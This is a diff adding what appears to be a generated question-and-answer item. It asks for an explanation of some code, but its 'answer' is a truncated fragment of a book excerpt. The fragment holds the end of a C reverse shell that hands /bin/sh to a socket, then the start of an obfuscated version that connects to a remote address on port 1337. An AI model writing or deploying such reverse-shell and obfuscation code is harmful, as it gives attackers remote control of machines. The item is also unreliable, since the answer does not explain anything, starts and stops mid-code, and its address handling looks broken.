@@ -1,0 +1,28 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+dup2(sockfd, 2); // Redirect standard error
+execl("/bin/sh", "sh", NULL); // Execute shell
+}
+int main() {
+reverse_shell();
+return 0;
+}
+Example 6-16 shows the obfuscated code.
+Example 6-16 Obfuscating a Reverse Shell Code in C Obfuscated Code
+#include <stdio.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+void a1b2c3() {
+int x1x2x3;
+struct sockaddr_in y1y2y3;
+x1x2x3 = socket(AF_INET, SOCK_STREAM, 0);
+y1y2y3.sin_family = AF_INET;
+y1y2y3.sin_addr.s_addr = inet_addr("0A010203"); //
+y1y2y3.sin_port = htons(0x0539); // 1337 in hex
